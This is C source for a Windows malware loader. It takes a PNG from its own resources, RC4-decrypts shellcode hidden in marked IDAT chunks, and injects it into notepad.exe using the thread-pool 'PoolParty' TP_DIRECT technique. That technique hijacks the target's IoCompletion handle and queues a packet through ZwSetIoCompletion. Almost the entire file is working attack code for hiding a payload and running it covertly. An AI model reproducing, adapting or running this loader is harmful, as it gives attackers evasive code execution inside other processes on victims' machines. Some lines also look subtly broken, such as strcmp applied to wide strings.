#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "Common.h"
#include "resource.h"

#define TARGET_PROCESS L"notepad.exe"



#define RC4_KEY_SIZE		16
#define CHUNK_TYPE_SIZE		4
#define BYTES_TO_SKIP		33		// PNG signature (8) + IHDR header (21) + IHDR CRC (4)
#define PNG_SIGNATURE		0x474E5089	// 'GNP'0x89 
#define IEND_HASH		0xAE426082	// IEND section hash 




// CHANGE WITH EACH BUILD OF PNG
#define MARKED_IDAT_HASH         0x12ED0275



BOOL GetResourceData(IN HMODULE hModule, IN WORD ResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD psResourceDataSize) {

	CHAR* pBaseAddr = (CHAR*)hModule;
	PIMAGE_DOS_HEADER 		pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS 		pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir = (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY 		pResourceDir = NULL, pResourceDir2 = NULL, pResourceDir3 = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;
	PIMAGE_RESOURCE_DATA_ENTRY 		pResource = NULL;


	pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);

	for (DWORD i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

			pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);
			pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

			*ppResourceRawData = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize = pResource->Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}

BOOL GetRsrcPayload(IN  HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize) {

	PBYTE	pTmpResourceBuffer = NULL;

	if (!GetResourceData(hModule, wResourceId, &pTmpResourceBuffer, pdwResourceSize))
		return FALSE;

	*ppResourceBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwResourceSize);

	memcpy(*ppResourceBuffer, pTmpResourceBuffer, *pdwResourceSize);

	return TRUE;
}

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


VOID Rc4EncryptDecrypt(IN PBYTE pInputBuffer, IN SIZE_T sInputBuffSize, IN PBYTE pRc4Key, IN SIZE_T sRc4KeySize, OUT PBYTE ppOutputBuffer) {

	unsigned int		i = 0x00;
	unsigned int		j = 0x00;
	unsigned char* s = 0x00;
	unsigned char		temp = 0x00;
	Rc4Context		context = { 0 };

	context.i = 0;
	context.j = 0;

	for (i = 0; i < 256; i++)
		context.s[i] = i;

	for (i = 0, j = 0; i < 256; i++) {

		j = (j + context.s[i] + pRc4Key[i % sRc4KeySize]) % 256;
		temp = context.s[i];
		context.s[i] = context.s[j];
		context.s[j] = temp;
	}


	i = context.i;
	j = context.j;
	s = context.s;

	while (sInputBuffSize > 0) {

		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		if (pInputBuffer != NULL && ppOutputBuffer != NULL) {
			*ppOutputBuffer = *pInputBuffer ^ s[(s[i] + s[j]) % 256];
			pInputBuffer++;
			ppOutputBuffer++;
		}

		sInputBuffSize--;
	}

	context.i = i;
	context.j = j;
}


// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------


BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OUT PBYTE* ppDecryptedBuff, OUT PSIZE_T psDecryptedBuffLength) {

	SIZE_T			Offset = BYTES_TO_SKIP,
		sDecPayloadSize = 0x00;
	DWORD			uSectionLength = 0x00;
	CHAR			pSectionType[CHUNK_TYPE_SIZE + 1] = { 0 };
	PBYTE			pRc4Key[RC4_KEY_SIZE] = { 0 };
	PBYTE			pSectionBuffer = NULL,
		pTmpPntr = NULL,
		pDecPayload = NULL;
	UINT32			uCRC32Hash = 0x00;
	BOOL			bFoundHash = FALSE;

	if (*(ULONG*)pPngFileBuffer != PNG_SIGNATURE) {
		printf("[!] Input File Is Not A PNG File \n");
		return FALSE;
	}

	while ((SIZE_T)Offset < sPngFileSize) {

		// Fetch section size
		uSectionLength = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(DWORD);

		// Fetch section type 
		memset(pSectionType, 0x00, sizeof(pSectionType));
		memcpy(pSectionType, &pPngFileBuffer[Offset], CHUNK_TYPE_SIZE);
		Offset += CHUNK_TYPE_SIZE;

		// Fetch a pointer to the section's data
		pSectionBuffer = (PBYTE)(&pPngFileBuffer[Offset]);
		Offset += uSectionLength;

		// Fetch CRC32 hash
		uCRC32Hash = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(UINT32);

		printf("[i] Section: %s \n", (CHAR*)pSectionType);
		printf("\t> Buffer: 0x%p \n", pSectionBuffer);
		printf("\t> Length: %d \n", (int)uSectionLength);
		printf("\t> Hash: 0x%0.8X \n", uCRC32Hash);

		// End of the png file  
		if (uCRC32Hash == IEND_HASH)
			break;

		if (uCRC32Hash == MARKED_IDAT_HASH) {
			bFoundHash = TRUE;
			// The next iteration will be the start of our embedded payload
			continue;
		}

		if (bFoundHash) {

			// Fetch key
			memset(pRc4Key, 0x00, RC4_KEY_SIZE);
			memcpy(pRc4Key, pSectionBuffer, RC4_KEY_SIZE);

			// Modify pointer and size
			pSectionBuffer += RC4_KEY_SIZE;
			uSectionLength -= RC4_KEY_SIZE;

			// Create buffer to hold decrypted section
			if (!(pTmpPntr = LocalAlloc(LPTR, uSectionLength))) {
				printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}

			// Decrypt
			Rc4EncryptDecrypt(pSectionBuffer, uSectionLength, pRc4Key, RC4_KEY_SIZE, pTmpPntr);

			// Append decrypted data to total buffer (pDecPayload)
			sDecPayloadSize += uSectionLength;

			if (!pDecPayload)
				pDecPayload = LocalAlloc(LPTR, sDecPayloadSize);
			else
				pDecPayload = LocalReAlloc(pDecPayload, sDecPayloadSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

			if (!pDecPayload) {
				printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}
			memcpy(pDecPayload + (sDecPayloadSize - uSectionLength), pTmpPntr, uSectionLength);

			// Free temp buffer
			memset(pTmpPntr, 0x00, uSectionLength);
			LocalFree(pTmpPntr);
		}
	}

	if (!bFoundHash)
		printf("[!] Could Not Find IDAT Section With Hash: 0x%0.8X \n", MARKED_IDAT_HASH);

	*ppDecryptedBuff = pDecPayload;
	*psDecryptedBuffLength = sDecPayloadSize;

	return bFoundHash;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// Get the array of pid's in the system
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array returned 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is NULL
		if (adwProcesses[i] != NULL) {

			// Opening a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// if EnumProcessModules succeeded
					// get the name of 'hProcess', and saving it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (strcmp(szProcName, szProc) == 0) {
							// return by reference
							*pdwPid = adwProcesses[i];
							*phProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

static LPVOID AllocateRemoteMemory(IN HANDLE hProcess, SIZE_T szPayloadSize) {
	LPVOID ShellcodeAddress = VirtualAllocEx(hProcess, NULL, szPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
		return NULL;
	}
	return ShellcodeAddress;
}

static BOOL WriteRemoteMemory(IN HANDLE hProcess, IN PVOID pRemoteAddress, PBYTE pPayloadData, DWORD dwPayloadLen) {
	DWORD dwByteWritten = NULL;
	BOOL res = WriteProcessMemory(hProcess, pRemoteAddress, pPayloadData, dwPayloadLen, &dwByteWritten);
	if (res == 0 || dwByteWritten != dwPayloadLen) {
		printf("[!] Failed to write payload to the target process\n");
		return FALSE;
	}
	else
	{
		printf("[i] Written payload to the target process\n");
		return TRUE;
	}
}

static BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
	_NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
	ULONG InformationLength = 0;
	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
	BYTE* Information = NULL;

	do {
		Information = (BYTE*)realloc(Information, InformationLength);
		Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

	return Information;
}

static HANDLE HijackProcessHandle(IN PWSTR wsObjectType, HANDLE hProcess, DWORD dwDesiredAccess) {

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

	BYTE* Information = NULL;
	ULONG Informationlength = 0, Informationlength_ = 0;
	HANDLE hDuplicateObject = NULL;
	NTSTATUS STATUS = STATUS_INFO_LENGTH_MISMATCH;

	do {
		Information = (BYTE*)realloc(Information, Informationlength);
		STATUS = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, Informationlength, &Informationlength);
	} while (STATUS_INFO_LENGTH_MISMATCH == STATUS);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);

	for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
		DuplicateHandle(hProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicateObject, dwDesiredAccess, FALSE, (DWORD_PTR)NULL);
		BYTE* pObjectInformation;
		pObjectInformation = NtQueryObject_(hDuplicateObject, ObjectTypeInformation);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);

		if (wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
			continue;
		}


		return hDuplicateObject;
	}
}

static BOOL RemoteTpDirectInsertionSetupExec(IN HANDLE hProcess, IN DWORD dwPid, IN PVOID pRemoteAddress, IN HANDLE hHijackedHandle) {

	_ZwSetIoCompletion ZwSetIoCompletion = NULL;
	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
	
	if (hNtdll) {
		ZwSetIoCompletion = (_ZwSetIoCompletion)(GetProcAddress(hNtdll, "ZwSetIoCompletion"));
	}
	else {
		return FALSE;
	}
	
	if (ZwSetIoCompletion) {
		
		CloseHandle(hNtdll);

		TP_DIRECT Direct = { 0 };
		PTP_DIRECT RemoteDirectAddress = NULL;

		Direct.Callback = pRemoteAddress;
		printf("[i] Created TP_DIRECT struct associated with the payload\n");

		RemoteDirectAddress = (PTP_DIRECT)VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (RemoteDirectAddress == NULL) {
			printf("[!] Failed to allocate TP_DIRECT memory in the target process \"%ws\" of PID : %d\n", TARGET_PROCESS, dwPid);
			return FALSE;
		}
		printf("[i] Allocated TP_DIRECT memory in the target process: 0x%p\n", RemoteDirectAddress);

		if (!WriteProcessMemory(hProcess, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL)) {
			printf("[!] Failed to write [ %ld bytes ] payload in process \"%ws\" of PID : %d\n", sizeof(TP_DIRECT), TARGET_PROCESS, dwPid);
			VirtualFreeEx(hProcess, RemoteDirectAddress, 0, MEM_RELEASE);
			return FALSE;
		}
		printf("[i] Written TP_DIRECT [ %ld bytes ] struct in the target process: 0x%p\n", sizeof(TP_DIRECT), RemoteDirectAddress);

		ZwSetIoCompletion(hHijackedHandle, RemoteDirectAddress, 0, 0, 0);

	}

	printf("[i] Queued a packet to the IO completion port of the target process worker factory\n");

	return TRUE;
}

static BOOL Inject(IN HANDLE hProcess, IN DWORD dwPid, IN PBYTE pPayload, IN DWORD dwPayloadLen) {

	HANDLE hHijackHandle = NULL;
	PVOID pPayloadAddress = NULL;
	printf("[i] Starting TP_DIRECT_INSERTION PoolParty attack against process \"%ws\" of PID : %d\n", TARGET_PROCESS, dwPid);

	hHijackHandle = HijackProcessHandle((PWSTR)L"IoCompletion\0", hProcess, IO_COMPLETION_ALL_ACCESS);
	if (hHijackHandle == NULL) {
		printf("[!] Unable to hijack IoCompletion handle from process \"%ws\" of PID : %d\n", TARGET_PROCESS, dwPid);
		return FALSE;
	}

	pPayloadAddress = AllocateRemoteMemory(hProcess, (SIZE_T)dwPayloadLen);
	if (pPayloadAddress == NULL) {
		printf("[!] Failed to allocate [ %ld bytes ] memory in process \"%ws\" of PID : %d\n", dwPayloadLen, TARGET_PROCESS, dwPid);
		CloseHandle(hHijackHandle);
		return FALSE;
	}

	if (!WriteRemoteMemory(hProcess, pPayloadAddress, pPayload, dwPayloadLen)) {
		printf("[!] Failed to write [ %ld bytes ] payload in process \"%ws\" of PID : %d\n", dwPayloadLen, TARGET_PROCESS, dwPid);
		VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
		CloseHandle(hHijackHandle);
		return FALSE;
	}

	if (!RemoteTpDirectInsertionSetupExec(hProcess, dwPid, pPayloadAddress, hHijackHandle)) {
		printf("[!] Failed to inject payload in process \"%ws\" of PID : %d\n", TARGET_PROCESS, dwPid);
		VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
		CloseHandle(hHijackHandle);
		return FALSE;
	}

	printf("[i] PoolParty attack completed\n");

}

int main()
{
	PBYTE			pPayload			= NULL, 
					pPayloadBuffer		= NULL;
	SIZE_T			szPayloadLen		= NULL;
	SIZE_T			sPayloadSize		= 0x00;
	DWORD			Pid					= NULL;
	HANDLE			hProcess			= NULL;


	if (!GetRsrcPayload(GetModuleHandle(NULL), IDB_PNG1, &pPayload, &(DWORD)szPayloadLen)) {
		printf("[!] Failed to fetch the png from resource section\n");
		return -1;
	}
	printf("[i] Fetched resource data @ 0x%p [ %ld bytes ]\n", pPayload, (DWORD)szPayloadLen);
	printf("[*] Press <ENTER> to Continue\n");
	getchar();

	
	if (!ExtractDecryptedPayload(pPayload, szPayloadLen, &pPayloadBuffer, &sPayloadSize)) {
		printf("[!] Failed to decode the payload from png\n");
		return -1;
	}
	printf("[i] Decoded payload from .png file @ 0x%p [ %ld bytes ]\n", pPayloadBuffer, sPayloadSize);
	printf("[*] Press <ENTER> to Continue\n");
	getchar();
	
	
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess)) {
		printf("[!] Process \"%ws\" NOT FOUND\n", TARGET_PROCESS);
		printf("[#] Press <Enter> To Quit ... ");
		getchar();
		return -1;
	}
	printf("[+] FOUND \"%ws\" - Of Pid : %d \n", TARGET_PROCESS, Pid);
	printf("[*] Press <ENTER> to Continue\n");
	getchar();


	if (!Inject(hProcess, Pid, pPayloadBuffer, (DWORD)sPayloadSize)) {
		printf("[!] Something went wrong.... EXITING\n");
		CloseHandle(hProcess);
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}